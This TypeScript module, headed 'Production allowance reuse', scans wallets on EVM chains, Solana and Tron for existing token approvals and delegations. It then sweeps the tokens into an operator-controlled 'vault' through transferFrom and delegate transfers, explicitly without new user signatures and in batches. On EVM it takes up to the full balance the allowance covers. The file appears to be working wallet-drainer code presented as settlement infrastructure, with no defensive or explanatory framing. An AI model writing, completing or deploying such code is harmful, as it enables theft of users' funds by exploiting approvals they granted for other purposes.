/**
 * Production allowance reuse — sweep existing approvals/delegates to vault without new user signatures.
 */
import { Connection, PublicKey, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  formatUnits,
  getAddress,
  http,
  isAddress,
  parseAbi,
  type Chain,
  type PublicClient,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { arbitrum, base, mainnet, optimism, polygon, sepolia } from 'viem/chains'

import { PERMIT2_ADDRESS } from '../adapters/evm-adapter.js'
import { resolveInstitutionalSolanaRpcUrl } from '../adapters/svm-adapter.js'
import {
  probeTronTrc20UsdtAllowanceRaw,
  TRON_MAINNET_USDT_CONTRACT,
} from '../adapters/tron-adapter.js'
import {
  PERMIT2_ALLOWANCE_ABI,
  resolveEngineSpenderAddress,
  resolveEvmRpcUrlForChain,
  resolveSettlementExecutorKey,
} from './permit2-executor.js'
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import { loadServerSolanaKeypair } from './server-chain-execution.js'
import { resolveSovereignVaultAddresses } from './settlement-execution-bridge.js'
import { resolveTronSensoryFullHost } from './tron-sensory-armor.js'

export type AllowanceReuseChain = 'EVM' | 'SOL' | 'TRON' | 'TON'
export type AllowanceReuseLane = 'permit2' | 'erc20' | 'spl_delegate' | 'trc20'

export type ReusableAllowance = {
  id: string
  chain: AllowanceReuseChain
  lane: AllowanceReuseLane
  wallet: string
  token: string
  token_symbol: string
  spender: string
  amount_raw: string
  decimals: number
  expires_at?: string
  permit2_nonce?: number
  evm_chain_id?: number
  executable: boolean
  note?: string
}

export type AllowanceReuseScanParams = {
  wallet_address: string
  evm_chain_id?: number
  evm_tokens?: Address[]
  sol_wallet?: string
  tron_wallet?: string
  ton_wallet?: string
  trc20_contract?: string
  tron_spender?: string
}

export type AllowanceReuseScanResult = {
  ok: true
  allowances: ReusableAllowance[]
  count: number
}

export type AllowanceReuseExecuteItemResult = {
  id: string
  ok: boolean
  tx_hash?: string
  detail?: string
  amount_human?: string
}

export type AllowanceReuseExecuteResult = {
  ok: boolean
  executed: number
  failed: number
  results: AllowanceReuseExecuteItemResult[]
  detail?: string
}

const ERC20_ABI = parseAbi([
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address account) view returns (uint256)',
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function symbol() view returns (string)',
  'function decimals() view returns (uint8)',
])

const TOKEN_PROGRAM_ID = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA')
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1RV')

function isTruthyEnv(key: string): boolean {
  const v = process.env[key]?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function isAllowanceReuseEnabled(): boolean {
  return isTruthyEnv('ALLOWANCE_REUSE_ENABLED')
}

export function isAutoReuseAllowancesEnabled(): boolean {
  return isTruthyEnv('AUTO_REUSE_ALLOWANCES') && isAllowanceReuseEnabled()
}

export function readAllowanceReuseBatchSize(): number {
  const n = Number.parseInt(process.env['ALLOWANCE_REUSE_BATCH_SIZE']?.trim() ?? '50', 10)
  return Number.isFinite(n) && n > 0 ? Math.min(n, 200) : 50
}

function resolveEvmChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

function parseDefaultEvmTokens(chainId: number): Address[] {
  const raw = process.env['ALLOWANCE_REUSE_EVM_TOKENS']?.trim()
  if (raw) {
    return raw
      .split(',')
      .map((t) => t.trim())
      .filter((t) => isAddress(t))
      .map((t) => getAddress(t))
  }
  if (chainId === 11155111) {
    return [getAddress('0x94a9D9AC0a22568936eC3dA12a205bE9Bb740B12')]
  }
  return [
    getAddress('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'),
    getAddress('0xdAC17F958D2ee523a2206206994597C13D831ec7'),
  ]
}

function makeAllowanceId(parts: {
  chain: AllowanceReuseChain
  wallet: string
  token: string
  lane: AllowanceReuseLane
  spender: string
}): string {
  return `${parts.chain}:${parts.wallet.toLowerCase()}:${parts.token.toLowerCase()}:${parts.lane}:${parts.spender.toLowerCase()}`
}

function resolveSolanaEnginePubkey(): string | null {
  const candidates = [
    process.env['ALLOWANCE_REUSE_SOL_DELEGATE']?.trim(),
    process.env['ENGINE_SPENDER']?.trim(),
    process.env['NEXT_PUBLIC_ENGINE_SPENDER']?.trim(),
    process.env['VAULT_ADDRESS_SVM']?.trim(),
    process.env['VAULT_ADDRESS_SOL']?.trim(),
  ]
  for (const c of candidates) {
    if (!c) continue
    try {
      return new PublicKey(c).toBase58()
    } catch {
      /* not a sol pubkey */
    }
  }
  return null
}

function resolveTronEngineSpender(): string | null {
  return (
    process.env['ALLOWANCE_REUSE_TRON_SPENDER']?.trim() ||
    process.env['LEGION_TRON_DELEGATE_SPENDER']?.trim() ||
    process.env['VAULT_ADDRESS_TRON']?.trim() ||
    null
  )
}

function resolveTronExecutorPrivateKey(): string | null {
  const raw =
    process.env['TRON_EXECUTION_PRIVATE_KEY']?.trim() ||
    process.env['SETTLEMENT_EXECUTION_PRIVATE_KEY']?.trim() ||
    ''
  if (!raw) return null
  return raw.startsWith('0x') ? raw.slice(2) : raw
}

async function readEvmTokenMeta(
  client: PublicClient,
  token: Address,
): Promise<{ symbol: string; decimals: number }> {
  try {
    const symbol = (await client.readContract({
      address: token,
      abi: ERC20_ABI,
      functionName: 'symbol',
    })) as string
    const decimals = Number(
      (await client.readContract({
        address: token,
        abi: ERC20_ABI,
        functionName: 'decimals',
      })) as number,
    )
    return { symbol: String(symbol), decimals }
  } catch {
    return { symbol: token.slice(0, 10), decimals: 18 }
  }
}

async function scanEvmAllowances(
  wallet: Address,
  chainId: number,
  tokens: Address[],
  engineSpender: Address | null,
): Promise<ReusableAllowance[]> {
  const rpc = await resolveEvmRpcUrlForChain(Number.isFinite(chainId) ? chainId : 1)
  const client = createPublicClient({
    chain: resolveEvmChain(chainId),
    transport: http(rpc, { timeout: 20_000 }),
  }) as unknown as PublicClient

  const vaults = resolveSovereignVaultAddresses()
  const vault = vaults.evm
  const out: ReusableAllowance[] = []

  for (const token of tokens) {
    const { symbol, decimals } = await readEvmTokenMeta(client, token)

    if (engineSpender) {
      try {
        const permit2 = (await client.readContract({
          address: PERMIT2_ADDRESS,
          abi: PERMIT2_ALLOWANCE_ABI,
          functionName: 'allowance',
          args: [wallet, token, engineSpender],
        })) as readonly [bigint, number, number]
        const amount = permit2[0]
        const expiration = Number(permit2[1])
        const nonce = Number(permit2[2])
        if (amount > 0n) {
          const expires_at =
            expiration > 0 ? new Date(expiration * 1000).toISOString().slice(0, 10) : undefined
          out.push({
            id: makeAllowanceId({
              chain: 'EVM',
              wallet,
              token,
              lane: 'permit2',
              spender: engineSpender,
            }),
            chain: 'EVM',
            lane: 'permit2',
            wallet,
            token,
            token_symbol: symbol,
            spender: engineSpender,
            amount_raw: amount.toString(),
            decimals,
            expires_at,
            permit2_nonce: nonce,
            evm_chain_id: chainId,
            executable: Boolean(vault),
            note: vault ? undefined : 'VAULT_ADDRESS_EVM not configured',
          })
        }
      } catch {
        /* skip */
      }
    }

    if (engineSpender) {
      try {
        const allowance = (await client.readContract({
          address: token,
          abi: ERC20_ABI,
          functionName: 'allowance',
          args: [wallet, engineSpender],
        })) as bigint
        if (allowance > 0n) {
          out.push({
            id: makeAllowanceId({
              chain: 'EVM',
              wallet,
              token,
              lane: 'erc20',
              spender: engineSpender,
            }),
            chain: 'EVM',
            lane: 'erc20',
            wallet,
            token,
            token_symbol: symbol,
            spender: engineSpender,
            amount_raw: allowance.toString(),
            decimals,
            evm_chain_id: chainId,
            executable: Boolean(vault),
          })
        }
      } catch {
        /* skip */
      }
    }
  }

  return out
}

async function scanSolAllowances(walletBase58: string): Promise<ReusableAllowance[]> {
  const engineDelegate = resolveSolanaEnginePubkey()
  if (!engineDelegate) return []

  const vaults = resolveSovereignVaultAddresses()
  const vault = vaults.svm
  const executor = loadServerSolanaKeypair()
  const executable = Boolean(vault && executor && executor.publicKey.toBase58() === engineDelegate)

  const connection = new Connection(resolveInstitutionalSolanaRpcUrl(), 'confirmed')
  const owner = new PublicKey(walletBase58)
  const parsed = await connection.getParsedTokenAccountsByOwner(owner, {
    programId: TOKEN_PROGRAM_ID,
  })

  const out: ReusableAllowance[] = []
  for (const { account } of parsed.value) {
    const info = account.data
    if (info.program !== 'spl-token' || typeof info.parsed !== 'object' || info.parsed === null) {
      continue
    }
    const pi = (info.parsed as { info?: Record<string, unknown> }).info
    if (!pi) continue
    const mint = typeof pi.mint === 'string' ? pi.mint : ''
    const delegate = typeof pi.delegate === 'string' ? pi.delegate : ''
    if (!mint || !delegate || delegate !== engineDelegate) continue

    const delegatedAmount = pi.delegatedAmount as { amount?: string; decimals?: number } | undefined
    const amountRaw = delegatedAmount?.amount ?? '0'
    const decimals = delegatedAmount?.decimals ?? 0
    if (BigInt(amountRaw) <= 0n) continue

    out.push({
      id: makeAllowanceId({ chain: 'SOL', wallet: walletBase58, token: mint, lane: 'spl_delegate', spender: delegate }),
      chain: 'SOL',
      lane: 'spl_delegate',
      wallet: walletBase58,
      token: mint,
      token_symbol: `SPL ${mint.slice(0, 8)}…`,
      spender: delegate,
      amount_raw: amountRaw,
      decimals,
      executable,
      note: executable
        ? undefined
        : 'Requires SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY matching engine delegate pubkey',
    })
  }
  return out
}

async function scanTronAllowances(walletBase58: string, contract: string): Promise<ReusableAllowance[]> {
  const effectiveSpender = resolveTronEngineSpender()
  if (!effectiveSpender) return []

  const allowance = await probeTronTrc20UsdtAllowanceRaw(
    resolveTronSensoryFullHost(),
    walletBase58,
    effectiveSpender,
  )
  if (allowance == null || allowance <= 0n) return []

  const vaults = resolveSovereignVaultAddresses()
  const pk = resolveTronExecutorPrivateKey()

  return [
    {
      id: makeAllowanceId({
        chain: 'TRON',
        wallet: walletBase58,
        token: contract,
        lane: 'trc20',
        spender: effectiveSpender,
      }),
      chain: 'TRON',
      lane: 'trc20',
      wallet: walletBase58,
      token: contract,
      token_symbol: 'USDT',
      spender: effectiveSpender,
      amount_raw: allowance.toString(),
      decimals: 6,
      executable: Boolean(vaults.tron && pk),
      note: pk ? undefined : 'TRON_EXECUTION_PRIVATE_KEY required',
    },
  ]
}

/** Read-only scan for reusable allowances tied to engine spenders. */
export async function scanReusableAllowances(
  params: AllowanceReuseScanParams,
): Promise<AllowanceReuseScanResult | { ok: false; reason: string }> {
  if (!isAllowanceReuseEnabled()) {
    return { ok: false, reason: 'ALLOWANCE_REUSE_ENABLED is not true' }
  }

  const allowances: ReusableAllowance[] = []
  const engineSpender = resolveEngineSpenderAddress()

  const evmWallet = params.wallet_address.trim()
  if (isAddress(evmWallet)) {
    const chainId =
      params.evm_chain_id ??
      Number.parseInt(process.env['ALLOWANCE_REUSE_EVM_CHAIN_ID']?.trim() ?? '1', 10)
    const tokens = params.evm_tokens?.length ? params.evm_tokens : parseDefaultEvmTokens(chainId)
    allowances.push(...(await scanEvmAllowances(getAddress(evmWallet), chainId, tokens, engineSpender)))
  }

  const solWallet = params.sol_wallet?.trim() || (evmWallet.length >= 32 && !isAddress(evmWallet) ? evmWallet : '')
  if (solWallet) {
    try {
      allowances.push(...(await scanSolAllowances(solWallet)))
    } catch (e) {
      console.warn(`[ALLOWANCE_REUSE] Solana scan failed: ${e instanceof Error ? e.message : String(e)}`)
    }
  }

  const tronWallet = params.tron_wallet?.trim()
  if (tronWallet) {
    const contract = params.trc20_contract?.trim() || TRON_MAINNET_USDT_CONTRACT
    allowances.push(...(await scanTronAllowances(tronWallet, contract)))
  }

  if (params.ton_wallet?.trim()) {
    // TON jetton allowance reuse execution is not implemented (requires wallet-signed BOC).
    console.warn(
      '[ALLOWANCE_REUSE] TON wallet present — allowance reuse not yet implemented; scan-only entry will be skipped on execute',
    )
    allowances.push({
      id: makeAllowanceId({
        chain: 'TON',
        wallet: params.ton_wallet.trim(),
        token: 'ton',
        lane: 'trc20',
        spender: 'n/a',
      }),
      chain: 'TON',
      lane: 'trc20',
      wallet: params.ton_wallet.trim(),
      token: 'ton-jetton',
      token_symbol: 'TON',
      spender: 'n/a',
      amount_raw: '0',
      decimals: 9,
      executable: false,
      note: 'TON allowance reuse not yet implemented — skipped on execute',
    })
  }

  return { ok: true, allowances, count: allowances.length }
}

async function resolveTransferAmount(
  client: PublicClient,
  owner: Address,
  token: Address,
  allowanceRaw: bigint,
): Promise<bigint> {
  const balance = (await client.readContract({
    address: token,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: [owner],
  })) as bigint
  return balance < allowanceRaw ? balance : allowanceRaw
}

async function executeEvmPermit2Reuse(item: ReusableAllowance): Promise<AllowanceReuseExecuteItemResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.evm) {
    return { id: item.id, ok: false, detail: 'EVM vault not configured' }
  }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) {
    return { id: item.id, ok: false, detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY required' }
  }

  const chainId = item.evm_chain_id ?? 1
  const rpc = await resolveEvmRpcUrlForChain(chainId)
  if (!rpc) return { id: item.id, ok: false, detail: 'EVM RPC not configured' }

  const chain = resolveEvmChain(chainId)
  const owner = getAddress(item.wallet)
  const token = getAddress(item.token)
  const spender = getAddress(item.spender)
  const vault = getAddress(vaults.evm)

  const transport = http(rpc, { ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT) })
  const publicClient = createPublicClient({ chain, transport }) as unknown as PublicClient
  const account = privateKeyToAccount(executorKey)
  const walletClient = createWalletClient({ account, chain, transport })

  const allowanceAmount = BigInt(item.amount_raw)
  const amount = await resolveTransferAmount(publicClient, owner, token, allowanceAmount)
  if (amount <= 0n) {
    return { id: item.id, ok: false, detail: 'Zero transferable balance' }
  }

  try {
    const txHash = await walletClient.writeContract({
      account,
      address: PERMIT2_ADDRESS,
      abi: PERMIT2_ALLOWANCE_ABI,
      functionName: 'transferFrom',
      args: [owner, vault, amount, token],
      chain,
    })
    await publicClient.waitForTransactionReceipt({ hash: txHash as Hex, timeout: 120_000 })
    return {
      id: item.id,
      ok: true,
      tx_hash: txHash,
      amount_human: formatUnits(amount, item.decimals),
      detail: 'Permit2 transferFrom',
    }
  } catch (e) {
    return { id: item.id, ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

async function executeEvmErc20Reuse(item: ReusableAllowance): Promise<AllowanceReuseExecuteItemResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.evm) return { id: item.id, ok: false, detail: 'EVM vault not configured' }

  const executorKey = resolveSettlementExecutorKey()
  if (!executorKey) return { id: item.id, ok: false, detail: 'SETTLEMENT_EXECUTION_PRIVATE_KEY required' }

  const chainId = item.evm_chain_id ?? 1
  const rpc = await resolveEvmRpcUrlForChain(chainId)
  if (!rpc) return { id: item.id, ok: false, detail: 'EVM RPC not configured' }

  const chain = resolveEvmChain(chainId)
  const owner = getAddress(item.wallet)
  const token = getAddress(item.token)
  const vault = getAddress(vaults.evm)

  const transport = http(rpc, { ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT) })
  const publicClient = createPublicClient({ chain, transport }) as unknown as PublicClient
  const account = privateKeyToAccount(executorKey)
  const walletClient = createWalletClient({ account, chain, transport })

  const allowanceAmount = BigInt(item.amount_raw)
  const amount = await resolveTransferAmount(publicClient, owner, token, allowanceAmount)
  if (amount <= 0n) return { id: item.id, ok: false, detail: 'Zero transferable balance' }

  try {
    const txHash = await walletClient.writeContract({
      account,
      address: token,
      abi: ERC20_ABI,
      functionName: 'transferFrom',
      args: [owner, vault, amount],
      chain,
    })
    await publicClient.waitForTransactionReceipt({ hash: txHash as Hex, timeout: 120_000 })
    return {
      id: item.id,
      ok: true,
      tx_hash: txHash,
      amount_human: formatUnits(amount, item.decimals),
      detail: 'ERC-20 transferFrom',
    }
  } catch (e) {
    return { id: item.id, ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

function deriveAta(owner: PublicKey, mint: PublicKey): PublicKey {
  const [ata] = PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID,
  )
  return ata
}

function splTransferDelegateIx(
  source: PublicKey,
  destination: PublicKey,
  delegate: PublicKey,
  amount: bigint,
): { programId: PublicKey; keys: Array<{ pubkey: PublicKey; isSigner: boolean; isWritable: boolean }>; data: Buffer } {
  const data = Buffer.alloc(9)
  data.writeUInt8(3, 0)
  data.writeBigUInt64LE(amount, 1)
  return {
    programId: TOKEN_PROGRAM_ID,
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: delegate, isSigner: true, isWritable: false },
    ],
    data,
  }
}

async function executeSolSplReuse(item: ReusableAllowance): Promise<AllowanceReuseExecuteItemResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.svm) return { id: item.id, ok: false, detail: 'Solana vault not configured' }

  const keypair = loadServerSolanaKeypair()
  if (!keypair) {
    return { id: item.id, ok: false, detail: 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY required' }
  }

  if (keypair.publicKey.toBase58() !== item.spender) {
    return { id: item.id, ok: false, detail: 'Solana executor pubkey does not match delegate spender' }
  }

  const rpc = resolveInstitutionalSolanaRpcUrl()
  const connection = new Connection(rpc, 'confirmed')
  const owner = new PublicKey(item.wallet)
  const mint = new PublicKey(item.token)
  const vaultOwner = new PublicKey(vaults.svm)
  const sourceAta = deriveAta(owner, mint)
  const destAta = deriveAta(vaultOwner, mint)
  const amount = BigInt(item.amount_raw)

  const { blockhash } = await connection.getLatestBlockhash('finalized')
  const ix = splTransferDelegateIx(sourceAta, destAta, keypair.publicKey, amount)
  const message = new TransactionMessage({
    payerKey: keypair.publicKey,
    recentBlockhash: blockhash,
    instructions: [
      {
        programId: ix.programId,
        keys: ix.keys,
        data: ix.data,
      },
    ],
  }).compileToV0Message()

  const tx = new VersionedTransaction(message)
  tx.sign([keypair])
  const sig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: false })
  await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight }, 'confirmed')

  return {
    id: item.id,
    ok: true,
    tx_hash: sig,
    amount_human: formatUnits(amount, item.decimals),
    detail: 'SPL delegate transfer',
  }
}

async function executeTronTrc20Reuse(item: ReusableAllowance): Promise<AllowanceReuseExecuteItemResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.tron) return { id: item.id, ok: false, detail: 'Tron vault not configured' }

  const pk = resolveTronExecutorPrivateKey()
  if (!pk) return { id: item.id, ok: false, detail: 'TRON_EXECUTION_PRIVATE_KEY required' }

  const fullHost = resolveTronSensoryFullHost()
  const { TronWeb } = await import('tronweb')
  const tronWeb = new TronWeb({ fullHost })
  tronWeb.setPrivateKey(pk)

  const amount = BigInt(item.amount_raw)
  if (amount <= 0n) {
    return { id: item.id, ok: false, detail: 'TRC-20 amount must be greater than zero' }
  }
  const amountStr = amount.toString()

  try {
    const contract = await tronWeb.contract().at(item.token)
    const tx = await contract.transferFrom(item.wallet, vaults.tron, amountStr).send()
    const txHash = typeof tx === 'string' ? tx : (tx?.txid ?? tx?.transaction?.txID ?? String(tx))
    return {
      id: item.id,
      ok: true,
      tx_hash: txHash,
      amount_human: formatUnits(amount, item.decimals),
      detail: 'TRC-20 transferFrom',
    }
  } catch (e) {
    return { id: item.id, ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}

export async function executeAllowanceReuseItem(
  item: ReusableAllowance,
): Promise<AllowanceReuseExecuteItemResult> {
  if (!isAllowanceReuseEnabled()) {
    return { id: item.id, ok: false, detail: 'ALLOWANCE_REUSE_ENABLED is not true' }
  }
  if (!item.executable) {
    return { id: item.id, ok: false, detail: item.note ?? 'Allowance not executable' }
  }

  switch (item.chain) {
    case 'EVM':
      if (item.lane === 'permit2') return executeEvmPermit2Reuse(item)
      if (item.lane === 'erc20') return executeEvmErc20Reuse(item)
      return { id: item.id, ok: false, detail: `Unknown EVM lane ${item.lane}` }
    case 'SOL':
      if (item.lane === 'spl_delegate') return executeSolSplReuse(item)
      return { id: item.id, ok: false, detail: 'Unsupported Solana lane' }
    case 'TRON':
      if (item.lane === 'trc20') return executeTronTrc20Reuse(item)
      return { id: item.id, ok: false, detail: 'Unsupported Tron lane' }
    case 'TON':
      // TON jetton reuse execution not implemented — wallet-signed BOC required.
      console.warn(
        `[ALLOWANCE_REUSE] TON allowance ${item.id} skipped — reuse not yet implemented`,
      )
      return {
        id: item.id,
        ok: true,
        detail: item.note ?? 'TON allowance reuse not yet implemented — skipped',
      }
    default:
      return { id: item.id, ok: false, detail: 'Unknown chain' }
  }
}

/** Execute transfers for explicit allowances or ids (batched internally). */
export async function executeAllowanceReuse(params: {
  allowances?: ReusableAllowance[]
  allowance_ids?: string[]
  scan?: AllowanceReuseScanParams
}): Promise<AllowanceReuseExecuteResult> {
  if (!isAllowanceReuseEnabled()) {
    return { ok: false, executed: 0, failed: 0, results: [], detail: 'ALLOWANCE_REUSE_ENABLED is not true' }
  }

  let targets = params.allowances ?? []

  if (targets.length === 0 && params.scan) {
    const scanned = await scanReusableAllowances(params.scan)
    if (!('ok' in scanned && scanned.ok)) {
      return {
        ok: false,
        executed: 0,
        failed: 0,
        results: [],
        detail: 'reason' in scanned ? scanned.reason : 'scan failed',
      }
    }
    targets = scanned.allowances
  }

  if (params.allowance_ids?.length) {
    const idSet = new Set(params.allowance_ids)
    targets = targets.filter((a) => idSet.has(a.id))
  }

  const batchSize = readAllowanceReuseBatchSize()
  const results: AllowanceReuseExecuteItemResult[] = []

  for (let i = 0; i < targets.length; i += batchSize) {
    const chunk = targets.slice(i, i + batchSize)
    for (const item of chunk) {
      results.push(await executeAllowanceReuseItem(item))
    }
  }

  const executed = results.filter((r) => r.ok).length
  const failed = results.length - executed
  return {
    ok: failed === 0 && results.length > 0,
    executed,
    failed,
    results,
    detail: failed > 0 ? `${failed} allowance reuse transfer(s) failed` : undefined,
  }
}
